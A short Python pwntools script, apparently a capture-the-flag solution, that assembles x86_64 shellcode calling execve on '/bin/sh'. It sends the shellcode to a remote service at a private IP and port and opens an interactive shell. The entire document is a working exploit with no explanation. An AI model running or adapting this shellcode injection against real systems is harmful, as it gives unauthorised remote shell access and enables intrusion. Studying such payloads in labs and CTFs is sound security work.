from pwn import *
context.log_level="DEBUG"
context(arch = 'x86_64',os='linux')
code="""
	push 0x3b
	pop rax
	inc ebx
	mov r15,0x68732f6e69622e
	add rbx,r15
	push rbx
	push rsp
	pop rdi
	syscall
"""
shellcode=asm(code)
conn=remote("10.131.1.19",60009)
conn.recv()
conn.sendline(shellcode)
conn.interactive()
